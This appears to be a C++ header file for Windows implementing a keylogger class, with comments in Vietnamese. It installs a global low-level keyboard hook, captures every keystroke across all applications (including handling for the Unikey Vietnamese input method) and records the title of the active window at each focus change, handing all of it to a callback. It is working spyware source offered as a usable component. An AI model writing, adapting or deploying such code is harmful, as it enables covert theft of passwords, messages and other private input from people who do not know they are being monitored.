#pragma once

#include <iostream>
#include <fstream>
#include <functional>
#include <atomic>
#include <thread>
#include <vector>
#include <string>

#include <windows.h>
#include <winuser.h>

#pragma comment(lib, "user32.lib")

using KeyEventCallback = std::function<void(std::string)>;

class Keylogging
{
private:
    inline static KeyEventCallback callback = nullptr;
    inline static std::atomic<bool> running = false;
    inline static HHOOK keyboardHook = nullptr;
    inline static std::thread worker;
    inline static DWORD threadId = 0;

    // Biến trạng thái Logic
    inline static bool lastKeyWasPhysical = false;
    inline static bool isShiftHeld = false;

    // [MỚI] Biến lưu tiêu đề cửa sổ cũ
    inline static std::string lastWindowTitle = "";

    static std::string WideToUtf8(const std::wstring &ws)
    {
        if (ws.empty())
            return "";
        int len = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, nullptr, 0, nullptr, nullptr);
        std::string out(len - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, &out[0], len, nullptr, nullptr);
        return out;
    }

    // [MỚI] Hàm lấy tiêu đề cửa sổ
    static std::string GetActiveWindowTitle()
    {
        HWND hwnd = GetForegroundWindow();
        if (!hwnd)
            return "";
        wchar_t title[1024];
        if (GetWindowTextW(hwnd, title, 1024) > 0)
        {
            return WideToUtf8(title);
        }
        return "";
    }

    static LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
    {
        if (nCode == HC_ACTION)
        {
            KBDLLHOOKSTRUCT *pKey = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
            DWORD vk = pKey->vkCode;
            bool isInjected = (pKey->flags & LLKHF_INJECTED) != 0;

            // --- 1. THEO DÕI TRẠNG THÁI SHIFT THỦ CÔNG ---
            if (vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_SHIFT)
            {
                if (wParam == WM_KEYDOWN)
                    isShiftHeld = true;
                else if (wParam == WM_KEYUP)
                    isShiftHeld = false;
            }

            // Chỉ xử lý sự kiện KeyDown (Nhấn phím)
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
            {
                // ============================================================
                // [MỚI] KIỂM TRA CỬA SỔ TRƯỚC KHI XỬ LÝ PHÍM
                // ============================================================
                // Chỉ kiểm tra khi là phím thật (để tránh check liên tục khi Unikey gửi phím ảo)
                if (!isInjected)
                {
                    std::string currentTitle = GetActiveWindowTitle();
                    if (!currentTitle.empty() && currentTitle != lastWindowTitle)
                    {
                        lastWindowTitle = currentTitle;
                        if (callback)
                        {
                            // Gửi log tiêu đề (xuống dòng cho đẹp)
                            callback("\n\n[ " + currentTitle + " ]\n");
                        }
                    }
                }
                // ============================================================

                // ============================================================
                // A. XỬ LÝ PHÍM VẬT LÝ (CODE CŨ CỦA BẠN - GIỮ NGUYÊN)
                // ============================================================
                if (!isInjected)
                {
                    if ((vk >= 0xA0 && vk <= 0xA5) || vk == VK_CAPITAL ||
                        (vk >= VK_F1 && vk <= VK_F24) || vk == VK_LWIN || vk == VK_RWIN)
                    {
                        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                    }

                    lastKeyWasPhysical = true;

                    if (vk == VK_BACK)
                    {
                        if (callback)
                            callback("[BACKSPACE]");
                        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                    }
                    if (vk == VK_RETURN)
                    {
                        if (callback)
                            callback("\n");
                        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                    }
                    if (vk == VK_TAB)
                    {
                        if (callback)
                            callback("\t");
                        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                    }

                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);

                    keyboardState[VK_SHIFT] = isShiftHeld ? 0x80 : 0;
                    if (GetKeyState(VK_CAPITAL) & 0x0001)
                        keyboardState[VK_CAPITAL] = 0x01;

                    wchar_t buffer[16] = {0};
                    HKL hkl = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), nullptr));
                    int ret = ToUnicodeEx(vk, pKey->scanCode, keyboardState, buffer, 16, 0, hkl);

                    if (ret > 0 && buffer[0] >= 32)
                    {
                        if (callback)
                            callback(WideToUtf8(buffer));
                    }
                    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                }

                // ============================================================
                // B. XỬ LÝ PHÍM ẢO (CODE CŨ CỦA BẠN - GIỮ NGUYÊN)
                // ============================================================
                else
                {
                    if (vk == VK_BACK)
                    {
                        if (lastKeyWasPhysical)
                        {
                            if (callback)
                            {
                                callback("[BACKSPACE]");
                                callback("[BACKSPACE]");
                            }
                            lastKeyWasPhysical = false;
                        }
                        else
                        {
                            if (callback)
                                callback("[BACKSPACE]");
                        }
                        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                    }

                    if (vk == VK_PACKET)
                    {
                        wchar_t ch = static_cast<wchar_t>(pKey->scanCode);
                        if (callback && ch != 0)
                        {
                            std::wstring ws(1, ch);
                            callback(WideToUtf8(ws));
                        }
                        lastKeyWasPhysical = false;
                        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                    }

                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);

                    // Logic quan trọng cho tiếng Việt: Reset Shift khi là phím ảo
                    keyboardState[VK_SHIFT] = 0;
                    if (GetKeyState(VK_CAPITAL) & 0x0001)
                        keyboardState[VK_CAPITAL] = 0x01;

                    wchar_t buffer[16] = {0};
                    HKL hkl = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), nullptr));
                    int ret = ToUnicodeEx(vk, pKey->scanCode, keyboardState, buffer, 16, 0, hkl);

                    if (ret > 0 && buffer[0] >= 32)
                    {
                        if (callback)
                            callback(WideToUtf8(buffer));
                        lastKeyWasPhysical = false;
                    }
                    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                }
            }
        }
        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
    }

    static void Loop()
    {
        threadId = GetCurrentThreadId();
        isShiftHeld = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
        lastWindowTitle = ""; // Reset tiêu đề

        HINSTANCE hInst = GetModuleHandle(nullptr);
        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hInst, 0);
        if (!keyboardHook)
        {
            running.store(false);
            return;
        }

        std::string title = GetActiveWindowTitle();
        if (!title.empty())
        {
            lastWindowTitle = title;
            if (callback)
            {
                callback("\n\n[ " + title + " ]\n");
            }
        }

        MSG msg;
        while (GetMessage(&msg, nullptr, 0, 0))
        {
            if (msg.message == WM_QUIT)
                break;
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = nullptr;
        threadId = 0;
    }

public:
    static void setCallback(KeyEventCallback cb) { callback = cb; }
    static void start()
    {
        if (running.load())
            return;
        running.store(true);
        worker = std::thread(Loop);
    }
    static void stop()
    {
        if (!running.load())
            return;
        running.store(false);
        if (threadId != 0)
            PostThreadMessage(threadId, WM_QUIT, 0, 0);
        if (worker.joinable())
            worker.join();
    }
};